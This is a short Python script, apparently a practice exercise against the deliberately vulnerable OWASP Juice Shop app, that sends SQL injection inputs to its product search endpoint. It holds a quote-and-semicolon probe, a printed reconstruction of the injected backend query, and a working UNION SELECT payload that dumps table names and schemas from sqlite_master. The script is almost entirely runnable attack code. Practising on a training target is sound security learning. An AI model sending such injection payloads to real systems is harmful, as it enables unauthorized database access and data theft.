import requests
import json

def response_content(resp):
    print(json.dumps(resp.json(), indent=4))

def search_for(value):
    base_url="https://juice-shop-kha.herokuapp.com/rest/products/search?q="
    response = requests.get(base_url + value, headers={'Accept': 'application/json'})
    response_content(response)


search_for("';")

print("")

print("SELECT * FROM Products WHERE ((name LIKE '%user_input%' OR description LIKE '%user_input%') AND deletedAt IS NULL) ORDER BY name")
print("SELECT * FROM Products WHERE ((name LIKE '%'))--%' OR description LIKE '%user_input%') AND deletedAt IS NULL) ORDER BY name")

#"id": 39,
#"name": "Juice Shop Adversary Trading Card (Common)",
#"description": "Common rarity \"Juice Shop\" card for the <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform\">Adversary Trading Cards</a> CCG.",
#"price": 2.99,
#"deluxePrice": 0.99,
#"image": "ccg_common.png",
#"createdAt": "2020-09-09 16:46:06.595 +00:00",
#"updatedAt": "2020-09-09 16:46:06.595 +00:00",
#"deletedAt": null


search_for(";;;')) UNION ALL Select 0, name, tbl_name, sql, NULL, NULL, NULL, NULL, NULL  From sqlite_master Where type='table' --")

